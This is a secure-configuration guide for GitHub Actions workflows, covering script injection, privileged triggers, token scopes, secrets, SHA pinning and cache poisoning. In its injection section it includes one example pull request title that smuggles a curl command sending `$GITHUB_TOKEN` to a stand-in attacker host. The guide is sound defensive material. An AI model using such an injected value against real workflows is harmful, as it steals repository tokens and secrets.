# Security

Adapted from [konstruktoid/agent-instructions-skills](https://github.com/konstruktoid/agent-instructions-skills/tree/db098c2e039c6fc8f0bfc3c0ab5dc4352d31faa0/skills/github/github-actions-security), `skills/github/github-actions-security` at commit `db098c2`. Copyright 2016 Thomas Sjögren, licensed under the Apache License 2.0; the full text is in [konstruktoid-LICENSE.txt](konstruktoid-LICENSE.txt). Changes: condensed `references/untrusted-input.md`, `permissions-and-secrets.md` and `supply-chain.md` into this file and reworded them. Runners, organization governance and workflows that run AI agents are not adapted here. Read the upstream references for those: [runners.md](https://github.com/konstruktoid/agent-instructions-skills/blob/db098c2e039c6fc8f0bfc3c0ab5dc4352d31faa0/skills/github/github-actions-security/references/runners.md), [scalability.md](https://github.com/konstruktoid/agent-instructions-skills/blob/db098c2e039c6fc8f0bfc3c0ab5dc4352d31faa0/skills/github/github-actions-security/references/scalability.md) and [agentic-workflows.md](https://github.com/konstruktoid/agent-instructions-skills/blob/db098c2e039c6fc8f0bfc3c0ab5dc4352d31faa0/skills/github/github-actions-security/references/agentic-workflows.md).

Normative sources: GitHub's [secure use reference](https://docs.github.com/en/actions/reference/security/secure-use) and OWASP's [GitHub Actions Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/GitHub_Actions_Security_Cheat_Sheet.html).

## Contents

- Untrusted input and injection
- Triggers that run privileged on outside input
- The token's permissions
- Secrets and OIDC
- Pinning and updating actions
- Cache and artifact poisoning
- Checklist

## Untrusted input and injection

- **`${{ }}` is pasted into the script before the shell runs it.** A pull request titled `a"; curl -s https://attacker.example/$(echo $GITHUB_TOKEN); echo "` turns `run: echo "Title: ${{ github.event.pull_request.title }}"` into the attacker's command, run with the job's token and secrets.
- **Pass values through `env:` and quote them:** `env: { PR_TITLE: ... }`, then `printf '%s\n' "$PR_TITLE"`. Passing a value to an action's `with:` input also keeps it data. The same goes for `actions/github-script`: read from `process.env`, not `${{ }}` inside `script:`.
- **Treat these as attacker-controlled:** `github.event.pull_request.title`, `.body`, `.head.ref`, `.head.label` and `.head.repo.*`; issue, comment, review and discussion titles and bodies; commit messages and author names and emails; `github.head_ref`; `github.event.workflow_run.head_branch`; `workflow_dispatch` inputs. The checked-out branch's files count too, including `package.json` scripts, Makefiles and pre-commit hooks.
- **Never build a path, tag or command from a branch name or author name.** Both can contain shell metacharacters.

## Triggers that run privileged on outside input

| Trigger | Runs | Token and secrets |
| --- | --- | --- |
| `pull_request` | The fork's merge ref | Read-only token, no secrets for fork PRs: the safe default |
| `pull_request_target` | The base repository's workflow | The configured `permissions`; secrets reachable |
| `workflow_run` | The base repository | Same; the triggering run's artifacts are untrusted |
| `issue_comment`, `issues` | The default branch | Same; anyone can comment |

- **Prefer `pull_request`.** Use `pull_request_target` only to comment, label or read a secret on fork PRs.
- **With `pull_request_target`, never check out or run the PR head.** `npm ci`, `pip install`, `make`, tests and linters all run the fork's code. If the files must be inspected, do it in a `pull_request` job without secrets, upload the result, and treat it as untrusted in the privileged workflow.
- **With `workflow_run`, filter on the source workflow, its conclusion and the branch.** Download artifacts into `$RUNNER_TEMP` and validate them. Never `eval` or source their contents, or write them to `$GITHUB_ENV`, `$GITHUB_OUTPUT` or `$GITHUB_PATH`: a `PATH=` line in `$GITHUB_ENV` affects every later step.
- **With comment triggers, check `github.event.comment.author_association`** (`OWNER`, `MEMBER`, `COLLABORATOR`) and resolve the PR head to a SHA before using it. A label a maintainer applies is a safer trigger, since applying it needs write access.
- **Require approval for outside contributors' runs** (Settings → Actions → General) and put `.github/workflows/` under CODEOWNERS.

## The token's permissions

- **Set the repository default to read-only.** It protects every workflow nobody has reviewed yet.
- **`permissions: {}` at workflow level, scopes per job.** A workflow-level grant reaches every job, including the one running untrusted code. Keep any job that runs PR code on `contents: read`, and put a write scope in its own job.
- **Grant only what a step calls:** checkout `contents: read`; push or release `contents: write`; PR comments `pull-requests: write`; issue comments `issues: write`; statuses or checks `statuses: write` or `checks: write`; SARIF upload `security-events: write`; GHCR push `packages: write`; OIDC `id-token: write`; managing caches and runs `actions: write`. No scope implies another.
- **`contents: write` is the scope an attacker wants:** it can push to unprotected branches and create releases. Treat a workflow holding it as a release workflow.
- **Events raised with `GITHUB_TOKEN` start no new runs,** except `workflow_dispatch` and `repository_dispatch`. When a downstream run is needed, prefer a GitHub App installation token to a personal access token.

## Secrets and OIDC

- **Anyone with write access can read every repository secret** by writing a workflow that prints it. Environment secrets reach only jobs that name the `environment:`, and its reviewers and branch rules gate them.
- **Pass secrets at step level, one value per secret,** and never `secrets: inherit` into a reusable workflow: name each one.
- **Mask derived values** (base64, URL-encoded) with `::add-mask::`. Never write a secret into an artifact, a coverage report or a core dump.
- **Keep runner details out of logs:** no `env` dumps or `set -x` as a habit. Logs are public on public repositories.
- **Prefer OIDC to stored cloud keys,** with the trust condition matching `sub` or `job_workflow_ref` exactly. `repo:org/*` trusts every repository in the organization, and `repo:org/repo:*` trusts every branch and PR. Use trusted publishing for registries that offer it (PyPI, npm, crates.io).

## Pinning and updating actions

- **Pin to the full 40-character SHA of a release commit, with the version in a comment.** The `tj-actions/changed-files` compromise (March 2025) repointed existing tags at a malicious commit, and every repository using the tag ran it on its next run.
- **Resolve the SHA from the action's repository** (`gh api repos/OWNER/REPO/releases/latest`, then `.../commits/<tag>`), and check that the commit belongs to that repository, not a fork reachable through its object store.
- **Pin to the newest release that clears a cooldown,** not to whatever the file already used. Read the release notes for every skipped version, and give the reason in a comment on the line when staying behind.
- **A pinned action can still fetch mutable code.** Read its `action.yml` for `uses:` on tags, `FROM …:latest`, `curl | bash` and unpinned installs. Reusable workflows are dependencies too: pin `org/repo/.github/workflows/x.yml@<sha>`.
- **Add no action when three lines of `run:` will do.** Each action brings code into a job that holds the token.
- **Keep pins current with Dependabot:**

  ```yaml
  version: 2
  updates:
    - package-ecosystem: github-actions
      directory: /
      schedule:
        interval: weekly
      cooldown:
        default-days: 7
  ```

  Security alerts are matched on versions, so a SHA-pinned action may get update PRs but no alert. Review and merge those PRs, reading the upstream diff between the two SHAs.
- **`pinact run -check` or `ratchet lint`** report unpinned references without editing. Their write modes rewrite files in place, so run them on a clean tree and review the diff.

## Cache and artifact poisoning

- **No caching in release or publishing workflows,** including implicit setup-action caches such as `setup-node` with `cache: npm`.
- **Don't let a PR build write a key that a default-branch run will restore.**
- **Treat an artifact from another workflow run as untrusted input** (see `workflow_run` above).
- **Attest published artifacts** with `actions/attest-build-provenance` (`id-token: write`, `attestations: write`) and document `gh attestation verify <file> --repo <owner>/<repo>`.

## Checklist

- [ ] No `${{ }}` of event data in `run:`, `script:` or a shell argument; values passed through `env:` and quoted
- [ ] `pull_request` used unless a stated reason needs `pull_request_target`; no privileged job checks out or runs fork code
- [ ] `permissions: {}` at workflow level, per-job scopes, no write scope in a job running PR code
- [ ] Secrets at step level, no `secrets: inherit`, no dumps or `set -x`
- [ ] Every `uses:` pinned to a resolved SHA with a version comment, at the newest release past the cooldown
- [ ] Dependabot covers `github-actions`
- [ ] `persist-credentials: false` on checkout unless the job pushes with it
- [ ] `timeout-minutes` on every job
- [ ] No caches in release workflows
- [ ] OIDC trust conditions match exactly
